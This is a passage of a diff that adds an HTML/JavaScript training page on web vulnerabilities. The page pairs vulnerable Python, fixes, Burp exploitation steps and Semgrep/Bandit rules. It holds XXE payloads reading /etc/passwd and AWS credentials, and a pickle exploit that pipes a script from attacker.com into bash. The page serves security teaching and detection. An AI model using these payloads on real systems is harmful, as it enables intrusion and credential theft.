+      - <span class="kw">pattern:</span> <span class="str">subprocess.run(..., shell=True)</span>
+    <span class="kw">message:</span> <span class="str">"Command injection risk — avoid shell=True"</span>`
+  },
+  {
+    id: 'xxe',
+    rank: 'A05 / CWE-611',
+    name: 'XML External Entity (XXE)',
+    sev: 'high', tags: ['High','CWE-611','A05:2021'],
+    color: '#fb923c', colorBg: '#1f0e05',
+    owasp: true, cwe: true,
+    desc: '<strong>App parses XML with external entity processing enabled.</strong> Attacker injects an XML entity that reads local files, performs SSRF, or causes DoS. Common in document upload features, SOAP APIs, and legacy integrations.',
+    impact: { conf: 100, integ: 40, avail: 60 },
+    howFind: ['Find any XML input — file uploads, SOAP endpoints, data imports','Inject XXE payload in Burp Repeater','Check if /etc/passwd content appears in response','Try blind XXE with Burp Collaborator for out-of-band data exfil','Look for Content-Type: application/xml in requests'],
+    tools: ['Burp Suite Repeater','Burp Scanner','XXEinjector'],
+    vulnCode: `<span class="cm"># VULNERABLE — XML parsed with external entities enabled</span>
+<span class="kw">from</span> lxml <span class="kw">import</span> etree
+
+<span class="kw">@app</span>.route(<span class="str">'/api/import-protocol'</span>, methods=[<span class="str">'POST'</span>])
+<span class="kw">def</span> <span class="fn">import_protocol</span>():
+    xml_data = request.data
+    parser = etree.<span class="fn">XMLParser</span>()  <span class="er"># Default — external entities ON!</span>
+    tree = etree.<span class="fn">fromstring</span>(xml_data, parser)
+    <span class="kw">return</span> <span class="fn">process</span>(tree)
+
+<span class="cm"># ATTACKER sends this XML payload:</span>
+<span class="cm"># &lt;?xml version="1.0"?&gt;</span>
+<span class="cm"># &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</span>
+<span class="cm"># &lt;protocol&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/protocol&gt;</span>
+<span class="cm"># Response leaks /etc/passwd contents!</span>`,
+    fixCode: `<span class="cm"># FIXED — disable external entity processing</span>
+<span class="kw">from</span> lxml <span class="kw">import</span> etree
+<span class="kw">from</span> defusedxml <span class="kw">import</span> ElementTree
+
+<span class="cm"># Option 1: defusedxml library (recommended)</span>
+<span class="kw">def</span> <span class="fn">parse_xml_safe</span>(xml_data):
+    <span class="kw">return</span> ElementTree.<span class="fn">fromstring</span>(xml_data)  <span class="ok"># ✓ safe by default</span>
+
+<span class="cm"># Option 2: lxml with explicit restrictions</span>
+parser = etree.<span class="fn">XMLParser</span>(
+    resolve_entities=False,   <span class="ok"># ✓ disable entity resolution</span>
+    no_network=True,          <span class="ok"># ✓ block network access</span>
+    load_dtd=False            <span class="ok"># ✓ disable DTD loading</span>
+)`,
+    burpSteps: `<span class="cm"># Step 1: Find XML upload endpoint, intercept in Burp</span>
+POST /api/import-protocol HTTP/1.1
+Content-Type: application/xml
+
+&lt;protocol&gt;&lt;name&gt;Test&lt;/name&gt;&lt;/protocol&gt;
+
+<span class="cm"># Step 2: In Repeater, inject XXE payload:</span>
+&lt;?xml version=<span class="str">"1.0"</span>?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM <span class="er">"file:///etc/passwd"</span>&gt;]&gt;
+&lt;protocol&gt;&lt;name&gt;<span class="er">&amp;xxe;</span>&lt;/name&gt;&lt;/protocol&gt;
+
+<span class="cm"># Step 3: If response contains root:x:0:0: = XXE confirmed!</span>
+
+<span class="cm"># Step 4: Read AWS credentials:</span>
+&lt;!ENTITY xxe SYSTEM <span class="er">"file:///root/.aws/credentials"</span>&gt;
+
+<span class="cm"># Step 5: Burp Scanner auto-detects XXE:</span>
+<span class="cm"># Right-click XML request → Scan → Active Scan</span>`,
+    sastRule: `<span class="cm"># Bandit B317, B318 — detects unsafe XML parsing</span>
+<span class="cm"># Run: bandit -r ./app -t B317,B318,B319</span>
+
+<span class="cm"># Semgrep:</span>
+<span class="kw">rules:</span>
+  - <span class="kw">id:</span> xxe-unsafe-parser
+    <span class="kw">pattern:</span> <span class="str">etree.XMLParser()</span>
+    <span class="kw">message:</span> <span class="str">"Default XMLParser allows XXE — use defusedxml"</span>
+    <span class="kw">severity:</span> ERROR`
+  },
+  {
+    id: 'crypto',
+    rank: 'A02 / CWE-327',
+    name: 'Cryptographic Failures',
+    sev: 'high', tags: ['High','CWE-327','A02:2021'],
+    color: '#a78bfa', colorBg: '#13102a',
+    owasp: true, cwe: true,
+    desc: '<strong>Sensitive data exposed due to weak or missing encryption.</strong> Includes: MD5/SHA1 for passwords, hardcoded secrets, weak keys, ECB mode encryption, data transmitted over HTTP, secrets in source code.',
+    impact: { conf: 100, integ: 30, avail: 10 },
+    howFind: ['Look for MD5, SHA1, DES in code — flag immediately','Check if passwords are stored as hashes or plaintext in DB','Search codebase for hardcoded: API_KEY, SECRET, PASSWORD','Check if app forces HTTPS — test HTTP redirect','Use truffleHog/git-secrets to scan git history for leaked secrets'],
+    tools: ['Bandit (SAST)','TruffleHog','git-secrets','Burp Suite (SSL check)'],
+    vulnCode: `<span class="cm"># VULNERABLE 1 — MD5 for password hashing</span>
+<span class="kw">import</span> hashlib
+<span class="kw">def</span> <span class="fn">hash_password</span>(password):
+    <span class="kw">return</span> hashlib.<span class="fn">md5</span>(password.encode()).<span class="fn">hexdigest</span>()  <span class="er"># NEVER!</span>
+    <span class="cm"># MD5 cracked in seconds — rainbow tables exist for all common passwords</span>
+
+<span class="cm"># VULNERABLE 2 — Hardcoded secret in source</span>
+SECRET_KEY = <span class="er">"mysupersecretkey123"</span>  <span class="er"># in app.py — committed to git!</span>
+AWS_ACCESS_KEY = <span class="er">"AKIAIOSFODNN7EXAMPLE"</span>  <span class="er"># leaked in git history</span>
+
+<span class="cm"># VULNERABLE 3 — ECB mode encryption (pattern-preserving)</span>
+<span class="kw">from</span> Crypto.Cipher <span class="kw">import</span> AES
+cipher = AES.<span class="fn">new</span>(key, <span class="er">AES.MODE_ECB</span>)  <span class="er"># ECB reveals data patterns!</span>`,
+    fixCode: `<span class="cm"># FIXED — bcrypt for passwords, env vars for secrets</span>
+<span class="kw">import</span> bcrypt, os
+
+<span class="kw">def</span> <span class="fn">hash_password</span>(password):
+    salt = bcrypt.<span class="fn">gensalt</span>(rounds=12)  <span class="ok"># ✓ bcrypt with salt</span>
+    <span class="kw">return</span> bcrypt.<span class="fn">hashpw</span>(password.encode(), salt)
+
+<span class="kw">def</span> <span class="fn">verify_password</span>(password, hashed):
+    <span class="kw">return</span> bcrypt.<span class="fn">checkpw</span>(password.encode(), hashed)
+
+<span class="cm"># Secrets from environment variables — NEVER hardcode</span>
+SECRET_KEY = os.<span class="fn">environ</span>[<span class="str">'SECRET_KEY'</span>]      <span class="ok"># ✓ from env</span>
+<span class="cm"># Or use AWS Secrets Manager / Vault</span>
+
+<span class="cm"># AES-GCM instead of ECB:</span>
+cipher = AES.<span class="fn">new</span>(key, <span class="ok">AES.MODE_GCM</span>)  <span class="ok"># ✓ authenticated encryption</span>`,
+    burpSteps: `<span class="cm"># Test 1: Check if app redirects HTTP to HTTPS</span>
+<span class="cm"># In Burp — send request over HTTP:</span>
+GET http://app.benchling.com/login HTTP/1.1
+<span class="cm"># Should return 301/302 redirect to HTTPS</span>
+<span class="cm"># If 200 over HTTP = credentials transmitted in plaintext!</span>
+
+<span class="cm"># Test 2: Inspect cookies for Secure flag</span>
+<span class="cm"># In Burp response headers:</span>
+Set-Cookie: session=abc <span class="er"># MISSING Secure flag — cookie sent over HTTP!</span>
+Set-Cookie: session=abc; <span class="ok">Secure; HttpOnly; SameSite=Strict</span>
+
+<span class="cm"># Test 3: Check TLS version in Burp SSL tab</span>
+<span class="cm"># Target → Site Map → right-click → Check SSL</span>
+<span class="cm"># TLSv1.0/1.1 = outdated, flag as finding</span>
+
+<span class="cm"># Test 4: Scan git history for secrets:</span>
+trufflehog git https://github.com/org/repo --only-verified`,
+    sastRule: `<span class="cm"># Bandit detects weak crypto automatically:</span>
+<span class="cm"># B303: MD5/SHA1 use</span>
+<span class="cm"># B324: hashlib.md5 or hashlib.sha1</span>
+<span class="cm"># B105: Hardcoded password string</span>
+<span class="cm"># Run: bandit -r ./app</span>
+
+<span class="cm"># TruffleHog — scan for secrets:</span>
+trufflehog filesystem ./  --only-verified
+trufflehog git file://. --since-commit HEAD~50`
+  },
+  {
+    id: 'deserial',
+    rank: 'A08 / CWE-502',
+    name: 'Insecure Deserialization',
+    sev: 'crit', tags: ['Critical','CWE-502','A08:2021'],
+    color: '#f87171', colorBg: '#1f0505',
+    owasp: true, cwe: true,
+    desc: '<strong>App deserializes untrusted data without validation — attacker crafts malicious serialized objects to execute code.</strong> Python pickle, Java ObjectInputStream, PHP unserialize all vulnerable. Often leads to Remote Code Execution.',
+    impact: { conf: 100, integ: 100, avail: 100 },
+    howFind: ['Look for pickle.loads(), ObjectInputStream, unserialize() in code','Find base64 blobs in cookies or request bodies','Decode the blob — does it look like serialized data?','Use ysoserial (Java) or pickle payloads (Python)','Burp: decode cookie, check for serialized object markers'],
+    tools: ['Burp Suite Decoder','ysoserial','pickletools','Burp Repeater'],
+    vulnCode: `<span class="cm"># VULNERABLE — Python pickle deserialization</span>
+<span class="kw">import</span> pickle, base64
+
+<span class="kw">@app</span>.route(<span class="str">'/api/load-session'</span>)
+<span class="kw">def</span> <span class="fn">load_session</span>():
+    data = request.cookies.get(<span class="str">'session_data'</span>)
+    <span class="cm"># Decodes and deserializes attacker-controlled data!</span>
+    session = pickle.<span class="fn">loads</span>(<span class="fn">base64.b64decode</span>(data))  <span class="er"># RCE!</span>
+    <span class="kw">return</span> <span class="fn">jsonify</span>(session)
+
+<span class="cm"># ATTACKER crafts malicious pickle payload:</span>
+<span class="kw">import</span> pickle, os, base64
+<span class="kw">class</span> <span class="fn">Exploit</span>(object):
+    <span class="kw">def</span> <span class="fn">__reduce__</span>(self):
+        <span class="kw">return</span> (os.system, (<span class="str">'curl attacker.com/shell.sh | bash'</span>,))
+payload = base64.<span class="fn">b64encode</span>(pickle.<span class="fn">dumps</span>(<span class="fn">Exploit</span>()))
+<span class="cm"># Send this as cookie = Remote Code Execution on server!</span>`,
+    fixCode: `<span class="cm"># FIXED — never use pickle on untrusted data</span>
+<span class="kw">import</span> json, hmac, hashlib
+
+<span class="cm"># Use JSON + HMAC signature instead of pickle</span>
+<span class="kw">def</span> <span class="fn">create_session</span>(data):
+    payload = json.<span class="fn">dumps</span>(data)
+    sig = hmac.<span class="fn">new</span>(SECRET_KEY.encode(), payload.encode(),
+                    hashlib.sha256).<span class="fn">hexdigest</span>()
+    <span class="kw">return</span> f<span class="str">"{payload}.{sig}"</span>
+
+<span class="kw">def</span> <span class="fn">load_session</span>(token):
+    payload, sig = token.<span class="fn">rsplit</span>(<span class="str">'.'</span>, 1)
+    expected = hmac.<span class="fn">new</span>(...).hexdigest()
+    <span class="kw">if not</span> hmac.<span class="fn">compare_digest</span>(sig, expected):
+        <span class="kw">raise</span> ValueError(<span class="str">"Invalid signature"</span>)  <span class="ok"># ✓ verify before use</span>
+    <span class="kw">return</span> json.<span class="fn">loads</span>(payload)`,
+    burpSteps: `<span class="cm"># Step 1: Find cookies/params with base64 data in Burp</span>
+<span class="cm"># In Proxy → HTTP History, look for:</span>
+Cookie: session_data=gASV...  (base64 pickle starts with gASV)
+
+<span class="cm"># Step 2: Decode in Burp Decoder tab</span>
+<span class="cm"># Paste value → Decode as Base64 → check if it looks like binary</span>
+<span class="cm"># Python pickle magic bytes: \x80\x04\x95 (hex: 80 04 95)</span>
+
+<span class="cm"># Step 3: Craft PoC — just prove deserialization happens</span>
+<span class="cm"># Safe test: encode a time.sleep(5) pickle and send it</span>
+<span class="cm"># If response delays 5 seconds = RCE confirmed (blind)</span>
+
+<span class="cm"># Step 4: Report as Critical — do NOT execute actual payloads</span>
+<span class="cm"># PoC = time delay proof is enough for Critical finding</span>`,
+    sastRule: `<span class="cm"># Bandit B301, B302 — detects pickle usage</span>
+<span class="cm"># Run: bandit -r ./app -t B301,B302,B403</span>
+
+<span class="cm"># Semgrep:</span>
+<span class="kw">rules:</span>
+  - <span class="kw">id:</span> insecure-deserialization-pickle
+    <span class="kw">pattern-either:</span>
+      - <span class="kw">pattern:</span> <span class="str">pickle.loads($DATA)</span>
+      - <span class="kw">pattern:</span> <span class="str">pickle.load($FILE)</span>
+    <span class="kw">message:</span> <span class="str">"pickle.loads on untrusted data = RCE risk"</span>
+    <span class="kw">severity:</span> ERROR`
+  },
+  {
+    id: 'misconfig',
+    rank: 'A05 / CWE-16',
+    name: 'Security Misconfiguration',
+    sev: 'med', tags: ['Medium','CWE-16','A05:2021'],
+    color: '#fbbf24', colorBg: '#1c150a',
+    owasp: true, cwe: false,
+    desc: '<strong>App deployed with insecure defaults — debug mode on, verbose errors, default credentials, unnecessary features enabled, missing security headers.</strong> Easy to find, fast to exploit. Often the first thing a pentester checks.',
+    impact: { conf: 60, integ: 40, avail: 60 },
+    howFind: ['Check response headers — are security headers set?','Look for debug=True, stack traces in error responses','Try default creds on admin panels: admin/admin','Check /.git, /.env, /config.yaml exposed in web root','Run nikto -h target — catches misconfigs automatically'],
+    tools: ['Nikto','Burp Suite','Mozilla Observatory','SecurityHeaders.com'],
+    vulnCode: `<span class="cm"># VULNERABLE — Flask debug mode in production</span>
+<span class="kw">app</span>.run(debug=<span class="er">True</span>, host=<span class="str">'0.0.0.0'</span>)
+<span class="cm"># Debug mode exposes interactive Python console to anyone!</span>
+<span class="cm"># Stack traces reveal internal file paths, library versions</span>
+<span class="cm"># Werkzeug debugger = instant RCE if PIN is guessable</span>
+
+<span class="cm"># VULNERABLE — Missing security headers</span>
+<span class="cm"># Response has NO:</span>
+<span class="cm">#   Content-Security-Policy    → enables XSS</span>
+<span class="cm">#   X-Frame-Options            → enables clickjacking</span>
+<span class="cm">#   Strict-Transport-Security  → enables SSL stripping</span>
+<span class="cm">#   X-Content-Type-Options     → enables MIME sniffing</span>
+
+<span class="cm"># VULNERABLE — .env file exposed</span>
+<span class="cm"># curl https://target.com/.env returns:</span>
+<span class="cm"># DATABASE_URL=postgres://user:password@db:5432/prod</span>
+<span class="cm"># SECRET_KEY=abc123xyz</span>`,
+    fixCode: `<span class="cm"># FIXED — production config + security headers</span>
+<span class="kw">from</span> flask_talisman <span class="kw">import</span> Talisman
+
+<span class="cm"># Never run debug=True in production</span>
+<span class="kw">if</span> os.environ.get(<span class="str">'ENV'</span>) == <span class="str">'production'</span>:
+    app.config[<span class="str">'DEBUG'</span>] = False  <span class="ok"># ✓</span>
+    app.config[<span class="str">'TESTING'</span>] = False  <span class="ok"># ✓</span>
+
+<span class="cm"># Add all security headers automatically:</span>
+<span class="fn">Talisman</span>(app,
+    force_https=True,
+    strict_transport_security=True,
+    content_security_policy={<span class="str">'default-src'</span>: <span class="str">"'self'"</span>},
+    x_content_type_options=True,
+    x_frame_options=<span class="str">'DENY'</span>
+)
+<span class="cm"># Block .env access in nginx/webserver config:</span>
+<span class="cm"># location ~ /\.env { deny all; }</span>`,
+    burpSteps: `<span class="cm"># Test 1: Check security headers in Burp</span>
+<span class="cm"># Send GET / and check Response headers tab:</span>
+<span class="er">Missing: Content-Security-Policy</span>
+<span class="er">Missing: Strict-Transport-Security</span>
+<span class="er">Missing: X-Frame-Options</span>
+<span class="er">X-Powered-By: Flask/2.0  ← version disclosure!</span>
+
+<span class="cm"># Test 2: Check for exposed sensitive files</span>
+GET /.env HTTP/1.1          <span class="cm"># secrets?</span>
+GET /.git/config HTTP/1.1   <span class="cm"># git repo exposed?</span>
+GET /debug HTTP/1.1         <span class="cm"># debug panel?</span>
+
+<span class="cm"># Test 3: Trigger a 500 error — does it show stack trace?</span>
+GET /api/user?id=AAAA HTTP/1.1
+<span class="cm"># If response shows file paths, library names = info leak</span>
+
+<span class="cm"># Test 4: Run Nikto for automated misconfiguration scan:</span>
+nikto -h https://target.com -ssl`,
+    sastRule: `<span class="cm"># Bandit B201 — Flask debug mode</span>
+<span class="cm"># B105 — hardcoded password</span>
+<span class="cm"># Run: bandit -r ./app</span>
+
+<span class="cm"># Check security headers with Mozilla Observatory:</span>
+<span class="cm"># https://observatory.mozilla.org/analyze/benchling.com</span>
+
+<span class="cm"># In CI pipeline — scan for exposed .env files:</span>
+find . -name <span class="str">".env"</span> -not -path <span class="str">"./.git/*"</span>
+<span class="cm"># Should return nothing — .env must be in .gitignore</span>`
+  }
+];
+
+function renderVulns(filter) {
+  const list = document.getElementById('vulnList');
+  list.innerHTML = '';
+  vulns.filter(v => {
+    if (filter === 'all') return true;
+    if (filter === 'owasp') return v.owasp;
+    if (filter === 'cwe') return v.cwe;
+    if (filter === 'critical') return v.sev === 'crit';
+    return true;
+  }).forEach(v => {
+    const row = document.createElement('div');
+    row.className = 'vuln-row';
+    row.style.setProperty('--vc', v.color);
+    row.style.setProperty('--vc-bg', v.colorBg);
+    row.id = 'vuln-' + v.id;
+    row.innerHTML = `
+      <div class="vuln-header" onclick="toggleVuln('${v.id}')">
+        <span class="vuln-rank">${v.rank}</span>
+        <span class="vuln-name">${v.name}</span>
+        <div class="vuln-tags">
+          ${v.tags.map(t => `<span class="vtag ${t==='Critical'?'crit':t==='High'?'high':'med'}">${t}</span>`).join('')}
+        </div>
+        <span class="vuln-chevron">▶</span>
+      </div>
+      <div class="vuln-detail">
+        <div class="inner-tabs">
+          <button class="itab active" onclick="showInner('${v.id}','overview',this)">Overview</button>
+          <button class="itab" onclick="showInner('${v.id}','vuln',this)">Vulnerable Code</button>
+          <button class="itab" onclick="showInner('${v.id}','fix',this)">Fixed Code</button>
+          <button class="itab" onclick="showInner('${v.id}','burp',this)">Burp Steps</button>
+          <button class="itab" onclick="showInner('${v.id}','sast',this)">SAST Rule</button>
+        </div>
+        <div class="inner-panel active" id="${v.id}-overview">
+          <div class="desc-box"><p>${v.desc}</p></div>
+          <div class="info-grid">
+            <div class="ic">
+              <h5>How to find it</h5>
+              <ul>${v.howFind.map(h=>`<li>${h}</li>`).join('')}</ul>
+            </div>
+            <div class="ic">
+              <h5>Impact</h5>
+              <div class="impact-bar"><span>Confidentiality</span><div class="bar" style="width:${v.impact.conf}px"></div></div>
+              <div class="impact-bar"><span>Integrity</span><div class="bar" style="width:${v.impact.integ}px"></div></div>
+              <div class="impact-bar"><span>Availability</span><div class="bar" style="width:${v.impact.avail}px"></div></div>
+              <div class="tool-row" style="margin-top:12px">${v.tools.map(t=>`<span class="tp">${t}</span>`).join('')}</div>
+            </div>
+          </div>
+        </div>
+        <div class="inner-panel" id="${v.id}-vuln">
+          <div class="cb">
+            <div class="cb-label"><span class="badge badge-vuln">VULNERABLE</span> Python — Real world example</div>
+            <pre>${v.vulnCode}</pre>
+          </div>
+        </div>
+        <div class="inner-panel" id="${v.id}-fix">
+          <div class="cb">
+            <div class="cb-label"><span class="badge badge-fix">FIXED</span> Secure version</div>
+            <pre>${v.fixCode}</pre>
+          </div>
+        </div>
+        <div class="inner-panel" id="${v.id}-burp">
+          <div class="cb">
+            <div class="cb-label"><span class="badge badge-burp">BURP SUITE</span> Step-by-step exploitation</div>
+            <pre>${v.burpSteps}</pre>
+          </div>
+        </div>
+        <div class="inner-panel" id="${v.id}-sast">
+          <div class="cb">
+            <div class="cb-label"><span class="badge badge-sast">SAST RULE</span> Detection — Semgrep / Bandit</div>
+            <pre>${v.sastRule}</pre>
+          </div>
+        </div>
+      </div>`;
+    list.appendChild(row);
+  });
+}
+
+function toggleVuln(id) {
+  const row = document.getElementById('vuln-' + id);
+  row.classList.toggle('open');
+}
+
+function showInner(vulnId, tab, btn) {
+  const row = document.getElementById('vuln-' + vulnId);
+  row.querySelectorAll('.inner-panel').forEach(p => p.classList.remove('active'));
+  row.querySelectorAll('.itab').forEach(b => b.classList.remove('active'));
+  document.getElementById(vulnId + '-' + tab).classList.add('active');
+  btn.classList.add('active');
+}
+
+function filterVulns(f) {
+  document.querySelectorAll('.top-btn').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+  renderVulns(f);
+}
+
+renderVulns('all');
+</script>
+</body>
+</html>
